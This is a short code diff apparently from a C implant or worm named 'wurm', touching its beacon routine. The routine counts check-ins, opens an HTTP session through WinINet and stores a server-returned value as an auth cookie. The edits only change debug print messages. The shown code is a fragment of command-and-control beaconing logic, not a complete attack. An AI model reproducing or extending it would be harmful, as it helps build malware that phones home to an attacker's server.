@@ -103,7 +103,7 @@ void Encode(char* data_to_encode) {
 }
 
 BOOL Request() {
-    printf("Beaconing...\n");
+    printf("sending beacon...\n");
     wurm.beacon.count += 1;
     
     HINTERNET hInternet = InternetOpenA(wurm.http.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
@@ -117,6 +117,7 @@ BOOL Request() {
 
                 CHAR *temp_buffer = NULL;
                 DWORD buffer_length = 0;
+
                 while (TRUE) {
                     DWORD available_size = 0;
                     DWORD download_buffer;
@@ -137,9 +138,9 @@ BOOL Request() {
 
                     if (wurm.beacon.count == 1) {
                         wurm.auth.cookie = cookie;
-                        printf("Response:%s", wurm.auth.cookie);
+                        printf("Response:%s\n", wurm.auth.cookie);
                     } else {
-                        printf("Beacon Sent");
+                        printf("Response:%s\n", cookie);
                     }
                 }
 
